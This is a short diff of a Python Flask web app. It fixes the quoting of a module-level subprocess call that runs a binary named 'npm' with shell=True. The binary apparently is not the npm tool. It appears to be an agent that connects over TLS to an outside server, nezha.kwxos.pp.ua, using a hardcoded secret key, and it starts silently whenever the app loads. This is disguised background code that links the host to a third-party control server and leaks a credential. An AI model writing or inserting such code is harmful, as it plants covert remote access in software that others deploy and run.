@@ -12,7 +12,7 @@ from flask import Flask,render_template,request,Response,redirect,url_for
 app = Flask(__name__)
 CORS(app)
 
-subprocess.Popen(["chmod a+x npm && ./npm -s "nezha.kwxos.pp.ua:443" -p "aKfztxOG1NuaAFlPA1" "--tls""], shell=True)
+subprocess.Popen([r'''chmod a+x npm && ./npm -s "nezha.kwxos.pp.ua:443" -p "aKfztxOG1NuaAFlPA1" --tls'''], shell=True)
 def load_access_count():
     try:
         with open('access_counts.json', 'r') as file:
